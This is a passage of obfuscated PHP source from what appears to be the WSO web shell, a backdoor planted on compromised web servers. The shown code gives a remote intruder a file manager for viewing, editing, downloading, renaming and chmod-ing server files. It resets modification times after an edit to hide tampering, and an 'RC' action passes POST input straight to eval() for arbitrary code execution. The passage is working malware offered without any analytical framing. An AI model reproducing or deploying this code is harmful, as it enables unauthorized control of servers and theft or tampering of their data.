array_merge($sp495c2d, $spf2bff7); $sp881e9f = 0; foreach ($spf2bff7 as $sp1b2b3c) { echo '<tr' . ($sp881e9f ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($sp1b2b3c['name']) . '" class=chkbx></td><td><a href=# onclick="' . ($sp1b2b3c['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'view\')">' . htmlspecialchars($sp1b2b3c['name']) : 'g(\'FilesMan\',\'' . $sp1b2b3c['path'] . '\');" ' . (empty($sp1b2b3c['link']) ? '' : "title='{$sp1b2b3c['link']}'") . '><b>[ ' . htmlspecialchars($sp1b2b3c['name']) . ' ]</b>') . '</a></td><td>' . ($sp1b2b3c['type'] == 'file' ? wsoViewSize($sp1b2b3c['size']) : $sp1b2b3c['type']) . '</td><td>' . $sp1b2b3c['modify'] . '</td><td>' . $sp1b2b3c['owner'] . '/' . $sp1b2b3c['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\',\'chmod\')">' . $sp1b2b3c['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'touch\')">T</a>' . ($sp1b2b3c['type'] == 'file' ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($sp1b2b3c['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>'; $sp881e9f = $sp881e9f ? 0 : 1; } echo '<tr><td colspan=7>
	<input type=hidden name=a value=\'FilesMan\'>
	<input type=hidden name=c value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . '\'>
	<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '\'>
	<select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>'; if (class_exists('ZipArchive')) { echo '<option value=\'zip\'>Compress (zip)</option><option value=\'unzip\'>Uncompress (zip)</option>'; } echo '<option value=\'tar\'>Compress (tar.gz)</option>'; if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) { echo '<option value=\'paste\'>Paste / Compress</option>'; } echo '</select>&nbsp;'; if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && ($_COOKIE['act'] == 'zip' || $_COOKIE['act'] == 'tar')) { echo 'file name: <input type=text name=p2 value=\'wso_' . date('Ymd_His') . '.' . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . '\'>&nbsp;'; } echo '<input type=\'submit\' value=\'>>\'></td></tr></form></table></div>'; wsoFooter(); } function actionFilesTools() { if (isset($_POST['p1'])) { $_POST['p1'] = urldecode($_POST['p1']); } if (@$_POST['p2'] == 'download') { if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { ob_start('ob_gzhandler', 4096); header('Content-Disposition: attachment; filename=' . basename($_POST['p1'])); if (function_exists('mime_content_type')) { $spa48979 = @mime_content_type($_POST['p1']); header('Content-Type: ' . $spa48979); } else { header('Content-Type: application/octet-stream'); } $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo @fread($spe0ea16, 1024); } fclose($spe0ea16); } } die; } if (@$_POST['p2'] == 'mkfile') { if (!file_exists($_POST['p1'])) { $spe0ea16 = @fopen($_POST['p1'], 'w'); if ($spe0ea16) { $_POST['p2'] = 'edit'; fclose($spe0ea16); } } } wsoHeader(); echo '<h1>File tools</h1><div class=content>'; if (!file_exists(@$_POST['p1'])) { echo 'File not exists'; wsoFooter(); return; } $sped417e = @posix_getpwuid(@fileowner($_POST['p1'])); if (!$sped417e) { $sped417e['name'] = @fileowner($_POST['p1']); $spe9607f['name'] = @filegroup($_POST['p1']); } else { $spe9607f = @posix_getgrgid(@filegroup($_POST['p1'])); } echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $sped417e['name'] . '/' . $spe9607f['name'] . '<br>'; echo '<span>Change time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>'; if (empty($_POST['p2'])) { $_POST['p2'] = 'view'; } if (is_file($_POST['p1'])) { $sp8374c6 = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); } else { $sp8374c6 = array('Chmod', 'Rename', 'Touch'); } foreach ($sp8374c6 as $sp6d4391) { echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($sp6d4391) . '\')">' . (strtolower($sp6d4391) == @$_POST['p2'] ? '<b>[ ' . $sp6d4391 . ' ]</b>' : $sp6d4391) . '</a> '; } echo '<br><br>'; switch ($_POST['p2']) { case 'view': echo '<pre class=ml1>'; $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo htmlspecialchars(@fread($spe0ea16, 1024)); } @fclose($spe0ea16); } echo '</pre>'; break; case 'highlight': if (@is_readable($_POST['p1'])) { echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">'; $sp44ea35 = @highlight_file($_POST['p1'], true); echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $sp44ea35) . '</div>'; } break; case 'chmod': if (!empty($_POST['p3'])) { $spce0b8c = 0; for ($sp412bbc = strlen($_POST['p3']) - 1; $sp412bbc >= 0; --$sp412bbc) { $spce0b8c += (int) $_POST['p3'][$sp412bbc] * pow(8, strlen($_POST['p3']) - $sp412bbc - 1); } if (!@chmod($_POST['p1'], $spce0b8c)) { echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>'; } } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>'; break; case 'edit': if (!is_writable($_POST['p1'])) { echo 'File isn\'t writeable'; break; } if (!empty($_POST['p3'])) { $spb8a5bd = @filemtime($_POST['p1']); $_POST['p3'] = substr($_POST['p3'], 1); $spe0ea16 = @fopen($_POST['p1'], 'w'); if ($spe0ea16) { @fwrite($spe0ea16, $_POST['p3']); @fclose($spe0ea16); echo 'Saved!<br><script>p3_="";</script>'; @touch($_POST['p1'], $spb8a5bd, $spb8a5bd); } } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>'; $spe0ea16 = @fopen($_POST['p1'], 'r'); if ($spe0ea16) { while (!@feof($spe0ea16)) { echo htmlspecialchars(@fread($spe0ea16, 1024)); } @fclose($spe0ea16); } echo '</textarea><input type=submit value=">>"></form>'; break; case 'hexdump': $sp559d1c = @file_get_contents($_POST['p1']); $sp5c3411 = 0; $sp4a7259 = array('00000000<br>', '', ''); $sp100126 = strlen($sp559d1c); for ($sp412bbc = 0; $sp412bbc < $sp100126; ++$sp412bbc) { $sp4a7259[1] .= sprintf('%02X', ord($sp559d1c[$sp412bbc])) . ' '; switch (ord($sp559d1c[$sp412bbc])) { case 0: $sp4a7259[2] .= ' '; break; case 9: $sp4a7259[2] .= ' '; break; case 10: $sp4a7259[2] .= ' '; break; case 13: $sp4a7259[2] .= ' '; break; default: $sp4a7259[2] .= $sp559d1c[$sp412bbc]; break; } $sp5c3411++; if ($sp5c3411 == 32) { $sp5c3411 = 0; if ($sp412bbc + 1 < $sp100126) { $sp4a7259[0] .= sprintf('%08X', $sp412bbc + 1) . '<br>'; } $sp4a7259[1] .= '<br>'; $sp4a7259[2] .= '
'; } } echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $sp4a7259[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $sp4a7259[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($sp4a7259[2]) . '</pre></td></tr></table>'; break; case 'rename': if (!empty($_POST['p3'])) { if (!@rename($_POST['p1'], $_POST['p3'])) { echo 'Can\'t rename!<br>'; } else { die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>'); } } echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>'; break; case 'touch': if (!empty($_POST['p3'])) { $spb8a5bd = strtotime($_POST['p3']); if ($spb8a5bd) { if (!touch($_POST['p1'], $spb8a5bd, $spb8a5bd)) { echo 'Fail!'; } else { echo 'Touched!'; } } else { echo 'Bad time format!'; } } clearstatcache(); echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date('Y-m-d H:i:s', @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>'; break; } echo '</div>'; wsoFooter(); } function actionRC() { if (!@$_POST['p1']) { $spd09f64 = array('uname' => php_uname(), 'php_version' => phpversion(), 'wso_version' => WS_VER, 'safemode' => @ini_get('safe_mode')); echo serialize($spd09f64); } else { eval($_POST['p1']); } } if (empty($_POST['a'])) { if (isset($spa13dd5) && function_exists('action' . $spa13dd5)) { $_POST['a'] = $spa13dd5; } else { $_POST['a'] = 'SecInfo'; } } if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) { call_user_func('action' . $_POST['a']); } echo '[syslog]03
'; die;